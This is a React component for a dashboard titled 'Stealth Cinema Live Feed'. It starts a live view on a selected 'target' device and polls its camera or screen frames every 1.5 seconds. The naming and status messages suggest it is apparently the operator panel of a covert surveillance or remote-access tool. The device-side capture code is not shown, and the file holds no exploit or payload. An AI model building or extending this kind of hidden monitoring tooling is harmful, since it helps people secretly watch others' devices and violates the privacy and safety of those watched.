import React, { useState, useEffect, useRef } from 'react';
import dataService from '../services/dataService';
import { Play, Square, RefreshCw, Radio, Monitor } from 'lucide-react';
import axios from 'axios';

export default function LiveScreenView({ selectedDevice }) {
  const [isLive, setIsLive] = useState(false);
  const [frameSrc, setFrameSrc] = useState(null);
  const [lastUpdated, setLastUpdated] = useState(null);
  const [error, setError] = useState(null);
  const timerRef = useRef(null);

  const handleStart = async () => {
    if (!selectedDevice) return;
    setIsLive(true);
    setError(null);
    try { await dataService.startLiveView(selectedDevice.id); } catch (e) {}
  };

  const handleStop = async () => {
    if (!selectedDevice) return;
    setIsLive(false);
    if (timerRef.current) clearInterval(timerRef.current);
    try { await dataService.stopLiveView(selectedDevice.id); } catch (e) {}
  };

  useEffect(() => {
    if (!isLive || !selectedDevice) return;
    timerRef.current = setInterval(async () => {
      try {
        const url = dataService.getLatestLiveFrameUrl(selectedDevice.id);
        const res = await axios.get(url, { responseType: 'blob' });
        if (res.status === 200) {
          const objUrl = URL.createObjectURL(res.data);
          setFrameSrc(prev => { if (prev) URL.revokeObjectURL(prev); return objUrl; });
          setLastUpdated(new Date().toLocaleTimeString());
          setError(null);
        }
      } catch (err) {
        setError('Waiting for incoming stream frames...');
      }
    }, 1500);

    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
      if (selectedDevice) dataService.stopLiveView(selectedDevice.id).catch(()=>{});
    };
  }, [isLive, selectedDevice]);

  return (
    <div className="p-6 h-full flex flex-col bg-slate-900 text-white rounded-xl shadow-2xl border border-slate-800">
      <div className="flex justify-between items-center pb-4 border-b border-slate-800">
        <div className="flex items-center gap-3">
          <Radio className={`w-6 h-6 ${isLive ? 'text-emerald-500 animate-pulse' : 'text-slate-500'}`} />
          <div>
            <h2 className="text-xl font-bold flex items-center gap-2"><Monitor className="w-5 h-5 text-blue-400" /> Stealth Cinema Live Feed</h2>
            <p className="text-sm text-slate-400">Target: {selectedDevice ? (selectedDevice.device_name || selectedDevice.name || selectedDevice.model) : 'No device selected'}</p>
          </div>
        </div>
        <div className="flex gap-3">
          {!isLive ? (
            <button onClick={handleStart} disabled={!selectedDevice} className="flex items-center gap-2 px-4 py-2 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 font-medium rounded-lg transition shadow-lg shadow-emerald-900/20">
              <Play className="w-4 h-4 fill-current" /> Start Live View
            </button>
          ) : (
            <button onClick={handleStop} className="flex items-center gap-2 px-4 py-2 bg-rose-600 hover:bg-rose-500 font-medium rounded-lg transition shadow-lg shadow-rose-900/20">
              <Square className="w-4 h-4 fill-current" /> Stop Feed
            </button>
          )}
        </div>
      </div>

      <div className="flex-1 mt-6 bg-black rounded-lg border-2 border-slate-800 flex items-center justify-center relative overflow-hidden min-h-[500px]">
        {frameSrc ? (
          <img src={frameSrc} alt="Live feed" className="max-h-full max-w-full object-contain" />
        ) : (
          <div className="text-center p-6">
            <RefreshCw className={`w-10 h-10 mx-auto text-slate-600 mb-3 ${isLive ? 'animate-spin text-blue-500' : ''}`} />
            <p className="text-slate-400 font-medium">{isLive ? (error || 'Connecting to target device camera engine...') : 'Live feed disconnected. Press Start.'}</p>
          </div>
        )}
        {isLive && (
          <div className="absolute top-4 left-4 bg-red-600/90 text-white backdrop-blur text-xs px-3 py-1 rounded-full font-bold uppercase tracking-wider flex items-center gap-1.5 shadow-md">
            <span className="w-2 h-2 rounded-full bg-white animate-ping" /> LIVE • 1.5s
          </div>
        )}
        {lastUpdated && <div className="absolute bottom-3 right-4 bg-slate-900/80 backdrop-blur text-xs text-slate-300 px-3 py-1 rounded border border-slate-800">Last frame: {lastUpdated}</div>}
      </div>
    </div>
  );
}
